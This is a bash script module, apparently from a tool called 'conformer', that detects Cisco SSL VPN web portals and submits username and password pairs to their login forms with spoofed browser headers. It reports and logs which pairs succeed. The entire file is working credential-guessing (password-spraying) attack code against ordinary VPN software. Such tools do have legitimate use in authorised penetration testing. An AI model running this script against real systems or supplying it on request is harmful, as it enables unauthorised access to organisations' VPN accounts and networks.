#!/bin/bash

check_ciscoSSLVPN(){
	old_ver=false;
	check_Portal=$(wget --timeout=4 -qO- https://$1/+CSCOE+/logon.html --no-check-certificate);
	if ([ "$(echo "$check_Portal" | grep 'name="username"')" ] && [ "$(echo "$check_Portal" | grep 'name="password"')" ] && [ "$(echo "$check_Portal" | grep 'name="Login"')" ]) || [[ $(echo "$5" | tr '[:upper:]' '[:lower:]' ) == "disable_check" ]] || [[ $(echo "$6" | tr '[:upper:]' '[:lower:]') == "disable_check" ]] || [[ $(echo "$7" | tr '[:upper:]' '[:lower:]') == "disable_check" ]] || [[ $(echo "$8" | tr '[:upper:]' '[:lower:]') == "disable_check" ]] ; then
		:
	else	
		#Check for older version 2010?
		check_Portal=$(wget --timeout=4 -qO- https://$1/webvpn.html --no-check-certificate);
		if ([ "$(echo "$check_Portal" | grep "username")" ] && [ "$(echo "$check_Portal" | grep "password")" ] && [ "$(echo "$check_Portal" | grep "Login")" ]) || [[ $(echo "$5" | tr '[:upper:]' '[:lower:]' ) == "disable_check" ]] || [[ $(echo "$6" | tr '[:upper:]' '[:lower:]') == "disable_check" ]] || [[ $(echo "$7" | tr '[:upper:]' '[:lower:]') == "disable_check" ]] || [[ $(echo "$8" | tr '[:upper:]' '[:lower:]') == "disable_check" ]] ; then
			old_ver=true;
			echo "";
			echo "***This Version of CiscoSSLVPN is older, Module for this portal is incomplete and might show false positives***";
			echo "";
		else	
			echo "Either not a CiscoSSLVPN portal, or not compatible version.";
			echo "Exiting...";
			exit 1;
		fi
	fi
}

POST_ciscoSSLVPN(){
LOG_YES=false;
LOG=/tmp/conformer.log;
#Determine if Logging, and where to log
if [[ $(echo "$5" | tr '[:upper:]' '[:lower:]') == "log="* ]] || [[ $(echo "$6" | tr '[:upper:]' '[:lower:]') == "log="* ]] || [[ $(echo "$7" | tr '[:upper:]' '[:lower:]') == "log="* ]] || [[ $(echo "$8" | tr '[:upper:]' '[:lower:]') == "log="* ]]; then
LOG_YES=true;
LOG=$(echo "$5" | grep -i log | cut -d "=" -f 2);
	if [[ "$LOG" == "" ]] ; then
		LOG=$(echo "$6" | grep -i log | cut -d "=" -f 2);
		if [[ "$LOG" == "" ]] ; then
			LOG=$(echo "$7" | grep -i log | cut -d "=" -f 2);
			if [[ "$LOG" == "" ]] ; then
				LOG=$(echo "$8" | grep -i log | cut -d "=" -f 2);
			fi
		fi
	fi
if [[ -d "$LOG" ]] ; then
	LOG_YES=false;
fi
fi


DEBUG_YES=false;
DEBUG=/tmp/conformer.debug;
#Determine if Debuging, and where to debug to.
if [[ $(echo "$5" | tr '[:upper:]' '[:lower:]') == "debug="* ]] || [[ $(echo "$6" | tr '[:upper:]' '[:lower:]') == "debug="* ]] || [[ $(echo "$7" | tr '[:upper:]' '[:lower:]') == "debug="* ]] || [[ $(echo "$8" | tr '[:upper:]' '[:lower:]') == "debug="* ]]; then
DEBUG_YES=true;
DEBUG=$(echo "$5" | grep -i debug | cut -d "=" -f 2);
	if [[ "$DEBUG" == "" ]] ; then
		DEBUG=$(echo "$6" | grep -i debug | cut -d "=" -f 2);
		if [[ "$DEBUG" == "" ]] ; then
			DEBUG=$(echo "$7" | grep -i debug | cut -d "=" -f 2);
			if [[ "$DEBUG" == "" ]] ; then
				DEBUG=$(echo "$8" | grep -i debug | cut -d "=" -f 2);
			fi
		fi
	fi
if [[ -d "$DEBUG" ]] ; then
	DEBUG_YES=false;
fi
fi

	#check which version.
	if [[ "$old_ver" != true ]] ; then			
			#Curl sends POST parameters to SSLVPL Portal
			POST=$(curl -i -s -k  -X $'POST' \
			    -H $'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101 Firefox/45.0' -H $'Referer: https://'$1'/+CSCOE+/logon.html?a0=15&a1=&a2=&a3=1' -H $'Content-Type: application/x-www-form-urlencoded' \
			    -b $'webvpnlogin=1; webvpnlogin=1; webvpnLang=en' \
			    --data-binary $'tgroup=&next=&tgcookieset=&username='$line'&password='$pass'&Login=Login' \
			    $'https://'$1'/+webvpn+/index.html');
		#If Logging is enabled loop userlist
		if [[ $DEBUG_YES == true ]]; then
			echo "host:$1 username:$line password:$pass" >> "$DEBUG";
			echo "" >> "$DEBUG";			
			echo "$POST" >> "$DEBUG";
			echo "" >> "$DEBUG";	
			echo "" >> "$DEBUG";	
			echo "-------------------------------------------------------------" >> "$DEBUG";	
		fi
			#checks if cookies returned or left empty or if default return html presented.
			if [[ $POST != *"webvpnc=;"* ]] && [[ $POST == *"webvpnc="* ]] ; then
				echo "	$line:$pass:**Success**";
			# Logging
			if [[ $LOG_YES == true ]]; then
				echo "	$line:$pass:**Success**" >> "$LOG";
			fi
			elif [[ $POST != *"webvpnc=;"* ]]; then
				echo "	$line:$pass:Fail --- Page not responding properly.";
			if [[ $LOG_YES == true ]]; then
				echo "	$line:$pass:Fail --- Page not responding properly." >> "$LOG";
			fi
			else
				echo "	$line:$pass:Fail";
			if [[ $LOG_YES == true ]]; then
				echo "	$line:$pass:Fail" >> "$LOG";
			fi
			fi
	
	else #Older version POST.
			#Curl sends POST parameters to older SSLVPL Portal 
			POST=$(curl -i -s -k  -X $'POST' \
			    -H $'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101 Firefox/45.0' -H $'Referer: https://'$1'/webvpn.html' -H $'Content-Type: application/x-www-form-urlencoded' \
			    -b $'webvpncontext=00@websslvpn; webvpnlang=1; stStarted=0' \
			    --data-binary $'username='$line'&password='$pass'&Login=Login&next=' \
			    $'https://'$1'/webvpn.html');
		#If Logging is enabled loop userlist
		if [[ $DEBUG_YES == true ]]; then
			echo "host:$1 username:$line password:$pass" >> "$DEBUG";
			echo "" >> "$DEBUG";			
			echo "$POST" >> "$DEBUG";
			echo "" >> "$DEBUG";	
			echo "" >> "$DEBUG";	
			echo "-------------------------------------------------------------" >> "$DEBUG";	
		fi

			if [[ $POST == *"msgLoginFail"* ]] ; then
				echo "	$line:$pass:Fail";
				#Logging	
				if [[ $LOG_YES == true ]]; then
					echo "	$line:$pass:Fail" >> "$LOG";
				fi
			elif [[ $POST != *"msgLoginFail"* ]] &&  [[ $POST != "" ]] ; then
				echo "	$line:$pass:**Success**";
				# Logging
				if [[ $LOG_YES == true ]]; then
					echo "	$line:$pass:**Success**" >> "$LOG";
				fi
			else			
				echo "	$line:$pass:Fail --- Page not responding properly.";
				if [[ $LOG_YES == true ]]; then
				echo "	$line:$pass:Fail --- Page not responding properly." >> "$LOG";
				fi
			fi


	fi


}
